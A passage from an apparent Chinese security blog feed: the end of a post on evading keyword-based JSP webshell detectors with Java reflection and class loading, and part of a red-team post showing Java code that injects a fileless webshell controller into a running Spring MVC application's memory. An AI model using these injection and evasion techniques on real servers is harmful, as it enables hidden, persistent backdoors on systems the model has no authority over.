<p>第一种和第二种方式显然无法规避Runtime等关键字获得Class对象；第三种使用Java反射机制和第四种使用Java类加载机制，都可以从全限定的类名字符串中获得Class对象，编码或变换下字符串的表现形式就可以规避Runtime等关键字，从而达到绕过软件检测的效果。</p>
<h3 id="0x07：后记"><a href="#0x07：后记" class="headerlink" title="0x07：后记"></a>0x07：后记</h3><p>Java语言不像PHP等语言那么灵活，本文探讨的绕过检测的方法，尽量使用较少的代码量和文件，达到了<strong>规避Runtime、ProcessBuilder等关键字</strong>执行系统命令的效果，但其实在规避命令执行关键字的同时<strong>引入了Java反射和类加载机制相关的关键词</strong>。</p>
<p>但是针对检测结果来说，用文中给的ProcessBuilder后门、0x04和0x05中给的新型后门，市面上一些仅利用脚本内容检测Webshell的软件和平台，都是检测不到异常的，其实这也从侧面印证了他们<strong>仅是通过关键词的匹配和已有恶意脚本库的比对</strong>等一些较为简单的方式来进行JSP相关的Webshell检测的。</p>
<p>对于专业的查杀软件和平台，仅仅通过文章中关键字来做后门的检测和判断的标准，一棒子打死，是不能兼顾准确率和查杀效果的。但对于个人来说，只需要全局搜索代码中的”<strong>.invoke(</strong>“关键词，人工简单看下代码，就能判断是不是Java反射后门和Java类加载机制后门了。</p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="http://tutorials.jenkov.com/java-reflection/index.html" target="_blank" rel="noopener">http://tutorials.jenkov.com/java-reflection/index.html</a></p>
<p><a href="https://docs.oracle.com/javase/7/docs/api/index.html?java/lang/reflect/package-summary.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/7/docs/api/index.html?java/lang/reflect/package-summary.html</a></p>
<p><a href="https://blog.csdn.net/briblue/article/details/54973413" target="_blank" rel="noopener">https://blog.csdn.net/briblue/article/details/54973413</a></p>
<p><a href="https://github.com/JustinSDK/JavaSE6Tutorial/blob/master/docs/CH16.md" target="_blank" rel="noopener">https://github.com/JustinSDK/JavaSE6Tutorial/blob/master/docs/CH16.md</a></p>
<p><a href="https://stackoverflow.com/questions/8100376/class-forname-vs-classloader-loadclass-which-to-use-for-dynamic-loading" target="_blank" rel="noopener">https://stackoverflow.com/questions/8100376/class-forname-vs-classloader-loadclass-which-to-use-for-dynamic-loading</a></p>
<p><a href="http://p2j.cn/?p=1627" target="_blank" rel="noopener">http://p2j.cn/?p=1627</a></p>
<p><a href="https://segmentfault.com/a/1190000004706888" target="_blank" rel="noopener">https://segmentfault.com/a/1190000004706888</a></p>
<p><a href="https://blog.csdn.net/zhangjg_blog/article/details/20380971" target="_blank" rel="noopener">https://blog.csdn.net/zhangjg_blog/article/details/20380971</a></p>
<p><a href="https://segmentfault.com/a/1190000010162647?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="noopener">https://segmentfault.com/a/1190000010162647?utm_source=tuicool&amp;utm_medium=referral</a></p>
<p><a href="https://stackoverflow.com/questions/6911427/is-it-possible-to-invoke-private-attributes-or-methods-via-reflection" target="_blank" rel="noopener">https://stackoverflow.com/questions/6911427/is-it-possible-to-invoke-private-attributes-or-methods-via-reflection</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
  <entry>
    <title>基于内存webshell</title>
    <url>/2020/08/04/spring-webshell/</url>
    <content><![CDATA[<h2 id="基于内存-Webshell-的无文件攻击技术研究"><a href="#基于内存-Webshell-的无文件攻击技术研究" class="headerlink" title="基于内存 Webshell 的无文件攻击技术研究"></a>基于内存 Webshell 的无文件攻击技术研究</h2><h2 id="一-情况介绍"><a href="#一-情况介绍" class="headerlink" title="一. 情况介绍"></a>一. 情况介绍</h2><p>红队人员在面对蓝队的严防死守与”盯梢”式的防御策略时，传统需要文件落地的攻击技术往往会受到掣肘，基于 Web 的无文件攻击技术逐渐成为 Web 安全的一种新的研究趋势。</p>
<p>所以我们重点研究了基于 Java 的常用 Web 框架 —  <code>SpringMvc</code>，并实现了利用多种不同的技术手段，往内存中注入恶意 Webshell 代码的无文件攻击技术。</p>
<h2 id="二-必要知识"><a href="#二-必要知识" class="headerlink" title="二. 必要知识"></a>二. 必要知识</h2><p>在切入正题前，首先需要了解下 <code>Spring</code> 框架中的几个必要的名词术语。</p>
<h3 id="Bean"><a href="#Bean" class="headerlink" title="Bean"></a>Bean</h3><p><code>bean</code> 是 Spring 框架的一个<strong>核心概念</strong>，它是构成应用程序的主干，并且是由 <code>Spring IoC</code> 容器负责实例化、配置、组装和管理的对象。</p>
<p>通俗来讲：</p>
<ul>
<li>bean 是对象</li>
<li>bean 被 IoC 容器管理</li>
<li>Spring 应用主要是由一个个的 bean 构成的</li>
</ul>
<h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p>Spring 框架中，<code>BeanFactory</code> 接口是 <code>Spring</code>  <strong>IoC容器</strong> 的实际代表者。</p>
<p>从下面的<code>接口继承关系图</code>中可以看出，<code>ApplicationContext</code> 接口继承了 <code>BeanFactory</code> 接口，并通过继承其他接口进一步扩展了基本容器的功能。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetnhoo6zj30x106oweh.jpg" alt="ApplicationContext-extends-interfaces"></p>
<p>因此，<code>org.springframework.context.ApplicationContext</code>接口也代表了 <code>IoC容器</code> ，它负责实例化、定位、配置应用程序中的对象(<code>bean</code>)及建立这些对象间(<code>beans</code>)的依赖。</p>
<p><code>IoC容器</code>通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用<code>xml</code>、<code>Java注解</code>或<code>Java代码</code>来表示。</p>
<p>另外，如下图，还有一堆各式各样的 context 继承了 <code>ApplicationContext</code> 接口，太繁杂不展开描述，仅供参考。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetnp9as6j30jz0jqn0d.jpg" alt="ApplicationContext-subtypes"></p>
<h3 id="ContextLoaderListener-与-DispatcherServlet"><a href="#ContextLoaderListener-与-DispatcherServlet" class="headerlink" title="ContextLoaderListener 与 DispatcherServlet"></a>ContextLoaderListener 与 DispatcherServlet</h3><p>下面是一个典型 Spring 应用的 <code>web.xml</code> 配置示例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"2.5"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>HelloSpringMVC<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/dispatcherServlet-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>在正式了解上面的配置前，先介绍下关于 <code>Root Context</code> 和 <code>Child Context</code> 的<strong>重要</strong>概念：</p>
<ul>
<li>Spring 应用中可以同时有多个 <code>Context</code>，其中只有一个 <code>Root Context</code>，剩下的全是 <code>Child Context</code></li>
<li>所有<code>Child Context</code>都可以访问在 <code>Root Context</code>中定义的 <code>bean</code>，但是<code>Root Context</code>无法访问<code>Child Context</code>中定义的 <code>bean</code></li>
<li>所有的<code>Context</code>在创建后，都会被作为一个属性添加到了 <code>ServletContext</code>中</li>
</ul>
<h4 id="ContextLoaderListener"><a href="#ContextLoaderListener" class="headerlink" title="ContextLoaderListener"></a>ContextLoaderListener</h4><p><code>ContextLoaderListener</code> 主要被用来初始化全局唯一的<code>Root Context</code>，即 <code>Root WebApplicationContext</code>。这个 <code>Root WebApplicationContext</code> 会和其他  <code>Child Context</code>  实例共享它的 <code>IoC 容器</code>，供其他 <code>Child Context</code> 获取并使用容器中的 <code>bean</code>。</p>
<p>回到 <code>web.xml</code> 中，其相关配置如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;context-param&gt;</span><br><span class="line">	&lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">	&lt;param-value&gt;/WEB-INF/applicationContext.xml&lt;/param-value&gt;</span><br><span class="line">&lt;/context-param&gt;</span><br><span class="line"></span><br><span class="line">&lt;listener&gt;</span><br><span class="line">	&lt;listener-<span class="class"><span class="keyword">class</span>&gt;<span class="title">org</span>.<span class="title">springframework</span>.<span class="title">web</span>.<span class="title">context</span>.<span class="title">ContextLoaderListener</span>&lt;/<span class="title">listener</span>-<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>依照规范，当没有显式配置 <code>ContextLoaderListener</code> 的  <code>contextConfigLocation</code> 时，程序会自动寻找 <code>/WEB-INF/applicationContext.xml</code>，作为配置文件，所以其实上面的 <code>&lt;context-param&gt;</code> 标签对其实完全可以去掉。</p>
<h4 id="DispatcherServlet"><a href="#DispatcherServlet" class="headerlink" title="DispatcherServlet"></a>DispatcherServlet</h4><p><code>DispatcherServlet</code> 的主要作用是处理传入的web请求，根据配置的 URL pattern，将请求分发给正确的 Controller 和 View。<code>DispatcherServlet</code> 初始化完成后，会创建一个普通的 <code>Child Context</code>  实例。</p>
<p>从下面的继承关系图中可以发现： <code>DispatcherServlet</code> 从本质上来讲是一个 <code>Servlet</code>（扩展了 <code>HttpServlet</code> )。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gheto6w68ij30ed04dt8v.jpg" alt="DispacherServlet"></p>
<p>回到 <code>web.xml</code> 中，其相关配置如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">	&lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;</span><br><span class="line">	&lt;servlet-<span class="class"><span class="keyword">class</span>&gt;<span class="title">org</span>.<span class="title">springframework</span>.<span class="title">web</span>.<span class="title">servlet</span>.<span class="title">DispatcherServlet</span>&lt;/<span class="title">servlet</span>-<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">init</span>-<span class="title">param</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">param</span>-<span class="title">name</span>&gt;<span class="title">contextConfigLocation</span>&lt;/<span class="title">param</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">param</span>-<span class="title">value</span>&gt;/<span class="title">WEB</span>-<span class="title">INF</span>/<span class="title">dispatcherServlet</span>-<span class="title">servlet</span>.<span class="title">xml</span>&lt;/<span class="title">param</span>-<span class="title">value</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">init</span>-<span class="title">param</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">load</span>-<span class="title">on</span>-<span class="title">startup</span>&gt;1&lt;/<span class="title">load</span>-<span class="title">on</span>-<span class="title">startup</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>上面给 <code>org.springframework.web.servlet.DispatcherServlet</code> 类设置了个别名 <code>dispatcherServlet</code> ，并配置了它的 <code>contextConfigLocation</code> 参数值为 <code>/WEB-INF/dispatcherServlet-servlet.xml</code>。</p>
<p>依照规范，当没有显式配置  <code>contextConfigLocation</code> 时，程序会自动寻找 ``/WEB-INF/<servlet-name>-servlet.xml<code>，作为配置文件。因为上面的</code><servlet-name><code>是</code>dispatcherServlet<code>，所以当没有显式配置时，程序依然会自动找到</code>/WEB-INF/dispatcherServlet-servlet.xml` 配置文件。</p>
<p>综上，可以了解到：每个具体的 <code>DispatcherServlet</code>  创建的是一个 <code>Child Context</code>，代表一个独立的 <code>IoC 容器</code>；而 <code>ContextLoaderListener</code> 所创建的是一个 <code>Root Context</code>，代表全局唯一的一个公共 <code>IoC 容器</code>。</p>
<p>如果要访问和操作 <code>bean</code> ，一般要获得当前代码执行环境的<code>IoC 容器</code> 代表者 <code>ApplicationContext</code>。</p>
<h2 id="三-技术要点"><a href="#三-技术要点" class="headerlink" title="三. 技术要点"></a>三. 技术要点</h2><ul>
<li>Q: spring 内存注入 Webshell，要达到什么样的效果？</li>
<li>A: 一言以蔽之：在执行完一段 java 代码后，可通过正常的 URL 访问到内存中的 Webshell 获得回显即可。</li>
</ul>
<p>在经过一番文档查阅和源码阅读后，发现可能有不止一种方法可以达到以上效果。其中通用的技术点主要有以下几个：</p>
<ol>
<li>在不使用注解和修改配置文件的情况下，使用纯 java 代码来获得当前代码运行时的上下文环境；</li>
<li>在不使用注解和修改配置文件的情况下，使用纯 java 代码在上下文环境中手动注册一个 controller；</li>
<li>controller 中写入 Webshell 逻辑，达到和 Webshell 的 URL 进行交互回显的效果；</li>
</ol>
<h2 id="四-技术实现"><a href="#四-技术实现" class="headerlink" title="四. 技术实现"></a>四. 技术实现</h2><h3 id="1-获得当前代码运行时的上下文环境"><a href="#1-获得当前代码运行时的上下文环境" class="headerlink" title="1. 获得当前代码运行时的上下文环境"></a>1. 获得当前代码运行时的上下文环境</h3><h4 id="方法一：getCurrentWebApplicationContext"><a href="#方法一：getCurrentWebApplicationContext" class="headerlink" title="方法一：getCurrentWebApplicationContext"></a><strong>方法一：getCurrentWebApplicationContext</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure>

<p>如下图， <code>getCurrentWebApplicationContext</code> 获得的是一个 <code>XmlWebApplicationContext</code> 实例类型的 <code>Root WebApplicationContext</code>。</p>
<p>注意这里及下面实现方法中的 <code>Root WebApplicationContext</code> 都是后文的一个伏笔。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetoi67a0j30v90b7dh1.jpg" alt="getCurrentWebApplicationContext"></p>
<h4 id="方法二：WebApplicationContextUtils"><a href="#方法二：WebApplicationContextUtils" class="headerlink" title="方法二：WebApplicationContextUtils"></a><strong>方法二：WebApplicationContextUtils</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br></pre></td></tr></table></figure>

<p>通过这种方法获得的也是一个 <code>Root WebApplicationContext</code> 。此方法看起来比较麻烦，其实拆分起来比较容易理解，主要是用 <code>WebApplicationContextUtils</code>的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> WebApplicationContext <span class="title">getWebApplicationContext</span><span class="params">(ServletContext sc)</span></span></span><br></pre></td></tr></table></figure>

<p>方法来获得当前上下文环境。其中 <code>WebApplicationContextUtils.getWebApplicationContext</code> 函数也可以用 <code>WebApplicationContextUtils.getRequiredWebApplicationContext</code>来替换。</p>
<p>剩余部分代码，都是用来获得 <code>ServletContext</code> 类的一个实例。仔细研究后可以发现，上面的代码完全可以简化成<strong>方法三</strong>中的代码。</p>
<h4 id="方法三：RequestContextUtils"><a href="#方法三：RequestContextUtils" class="headerlink" title="方法三：RequestContextUtils"></a><strong>方法三：RequestContextUtils</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br></pre></td></tr></table></figure>

<p>上面的代码使用 <code>RequestContextUtils</code> 的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> WebApplicationContext <span class="title">getWebApplicationContext</span><span class="params">(ServletRequest request)</span></span></span><br></pre></td></tr></table></figure>

<p>方法，通过 <code>ServletRequest</code> 类的实例来获得 <code>WebApplicationContext</code> 。</p>
<p>如下图，可以发现此方法获得的是一个名叫 <code>dispatcherServlet-servlet</code> 的 <code>Child WebApplicationContext</code>。这个 <code>dispatcherServlet-servlet</code> 其实是上面配置中 <code>dispatcherServlet-servlet.xml</code> 的文件名。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetoopya3j30xj0ci75t.jpg" alt="RequestContextUtils"></p>
<p>进一步分析，代码中有个 <code>RequestContextHolder.currentRequestAttributes()</code> ，在前置知识中已经提到过 </p>
<blockquote>
<p>所有的<code>Context</code>在创建后，都会被作为一个属性添加到了 <code>ServletContext</code>中</p>
</blockquote>
<p>然后如下图，查看当前所有的 <code>attributes</code>，发现确实保存有 <code>Context</code> 的属性名。</p>
<p>其中 <code>org.springframework.web.servlet.DispatcherServlet.CONTEXT</code> 和 <code>org.springframework.web.servlet.DispatcherServlet.THEME_SOURCE</code> 属性名中都存放着一个名叫 <code>dispatcherServlet-servlet</code> 的 <code>Child WebApplicationContext</code> 。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetoziujej31060gp771.jpg" alt="currentRequestAttributes"></p>
<h4 id="方法四：getAttribute"><a href="#方法四：getAttribute" class="headerlink" title="方法四：getAttribute"></a><strong>方法四：getAttribute</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>从<strong>方法三</strong>的分析来看，其实完全可以将存放在 <code>ServletContext</code> 属性中的 <code>Context</code> 取出来直接使用。在阅读相关源码后发现，上面代码中的 <code>currentRequestAttributes()</code> 替换成 <code>getRequestAttributes()</code> 也同样有效；<code>getAttribute</code> 参数中的 <code>0</code>代表从当前 <code>request</code> 中获取而不是从当前的 <code>session</code> 中获取属性值。</p>
<p>因此，使用以上代码也可以获得一个名叫 <code>dispatcherServlet-servlet</code> 的 <code>Child WebApplicationContext</code>。</p>
<h3 id="2-手动注册-controller"><a href="#2-手动注册-controller" class="headerlink" title="2. 手动注册 controller"></a>2. 手动注册 controller</h3><p>一个正常的 <code>Controller</code> 示例代码如下，当用浏览器访问 <code>/hello</code> 路径时，会在定义好的 <code>View</code> 中输出 <code>hello World</code> 字样。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/hello"</span>, method = RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(@RequestParam(value=<span class="string">"name"</span>, required=<span class="keyword">false</span>, defaultValue=<span class="string">"World"</span>)</span> String name, Model model) </span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">"name"</span>, name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>如下图：<strong>Spring 3.2.5</strong> 处理 URL 映射相关的类都实现了 <code>HandlerMapping</code> 接口。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetp52vvsj30kl08rab8.jpg" alt="HandlerMapping"></p>
<p><strong>Spring 2.5</strong> 开始到 <strong>Spring 3.1</strong> 之前一般使用 <code>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</code>  映射器 ；</p>
<p><strong>Spring 3.1</strong> 开始及以后一般开始使用新的 <code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code> 映射器来支持<code>@Contoller</code>和<code>@RequestMapping</code>注解。</p>
<p>当然，也有高版本依旧使用旧映射器的情况。因此正常程序的上下文中一般存在其中一种映射器的实例 <code>bean</code>。又因版本不同和较多的接口等原因，手工注册动态 <code>controller</code> 的方法不止一种。</p>
<h4 id="方法一：registerMapping"><a href="#方法一：registerMapping" class="headerlink" title="方法一：registerMapping"></a>方法一：registerMapping</h4><p>在 <strong>spring 4.0</strong> 及以后，可以使用 <code>registerMapping</code> 直接注册 <code>requestMapping</code> ，这是最直接的一种方式。</p>
<p>相关示例代码和解释如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span></span><br><span class="line">RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span></span><br><span class="line">Method method = (Class.forName(<span class="string">"me.landgrey.SSOLogin"</span>).getDeclaredMethods())[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// 3. 定义访问 controller 的 URL 地址</span></span><br><span class="line">PatternsRequestCondition url = <span class="keyword">new</span> PatternsRequestCondition(<span class="string">"/hahaha"</span>);</span><br><span class="line"><span class="comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span></span><br><span class="line">RequestMethodsRequestCondition ms = <span class="keyword">new</span> RequestMethodsRequestCondition();</span><br><span class="line"><span class="comment">// 5. 在内存中动态注册 controller</span></span><br><span class="line">RequestMappingInfo info = <span class="keyword">new</span> RequestMappingInfo(url, ms, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">r.registerMapping(info, Class.forName(<span class="string">"me.landgrey.SSOLogin"</span>).newInstance(), method);</span><br></pre></td></tr></table></figure>



<h4 id="方法二：registerHandler"><a href="#方法二：registerHandler" class="headerlink" title="方法二：registerHandler"></a>方法二：registerHandler</h4><p>参考上面的 <code>HandlerMapping</code> 接口继承关系图，针对使用 <code>DefaultAnnotationHandlerMapping</code> 映射器的应用，可以找到它继承的顶层类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">org.springframework.web.servlet.handler.AbstractUrlHandlerMapping</span><br></pre></td></tr></table></figure>

<p>进入查看代码，发现其中有一个<code>registerHandler</code> 方法，摘录关键部分如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">registerHandler</span><span class="params">(String urlPath, Object handler)</span> <span class="keyword">throws</span> BeansException, IllegalStateException </span>&#123;</span><br><span class="line">	...</span><br><span class="line">	Object resolvedHandler = handler;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">this</span>.lazyInitHandlers &amp;&amp; handler <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">		String handlerName = (String)handler;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.getApplicationContext().isSingleton(handlerName)) &#123;</span><br><span class="line">			resolvedHandler = <span class="keyword">this</span>.getApplicationContext().getBean(handlerName);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	Object mappedHandler = <span class="keyword">this</span>.handlerMap.get(urlPath);</span><br><span class="line">	<span class="keyword">if</span> (mappedHandler != <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (mappedHandler != resolvedHandler) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Cannot map "</span> + <span class="keyword">this</span>.getHandlerDescription(handler) + <span class="string">" to URL path ["</span> + urlPath + <span class="string">"]: There is already "</span> + <span class="keyword">this</span>.getHandlerDescription(mappedHandler) + <span class="string">" mapped."</span>);</span><br><span class="line">	...</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">this</span>.handlerMap.put(urlPath, resolvedHandler);</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.logger.isInfoEnabled()) &#123;</span><br><span class="line">			<span class="keyword">this</span>.logger.info(<span class="string">"Mapped URL path ["</span> + urlPath + <span class="string">"] onto "</span> + <span class="keyword">this</span>.getHandlerDescription(handler));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>该方法接受 <code>urlPath</code>参数和 <code>handler</code>参数，可以在 <code>this.getApplicationContext()</code> 获得的上下文环境中寻找名字为 <code>handler</code> 参数值的 <code>bean</code>, 将 url 和 controller 实例 bean 注册到 <code>handlerMap</code> 中。</p>
<p>相关示例代码和解释如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span></span><br><span class="line">context.getBeanFactory().registerSingleton(<span class="string">"dynamicController"</span>, Class.forName(<span class="string">"me.landgrey.SSOLogin"</span>).newInstance());</span><br><span class="line"><span class="comment">// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean</span></span><br><span class="line">org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">// 3. 反射获得 registerHandler Method</span></span><br><span class="line">java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod("registerHandler", String.class, Object.class);</span><br><span class="line">m1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 4. 将 dynamicController 和 URL 注册到 handlerMap 中</span></span><br><span class="line">m1.invoke(dh, <span class="string">"/favicon"</span>, <span class="string">"dynamicController"</span>);</span><br></pre></td></tr></table></figure>



<h4 id="方法三：detectHandlerMethods"><a href="#方法三：detectHandlerMethods" class="headerlink" title="方法三：detectHandlerMethods"></a>方法三：detectHandlerMethods</h4><p>参考上面的 <code>HandlerMapping</code> 接口继承关系图，针对使用 <code>RequestMappingHandlerMapping</code> 映射器的应用，可以找到它继承的顶层类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">org.springframework.web.servlet.handler.AbstractHandlerMethodMapping</span><br></pre></td></tr></table></figure>

<p>进入查看代码，发现其中有一个<code>detectHandlerMethods</code> 方法，代码如下：</p>
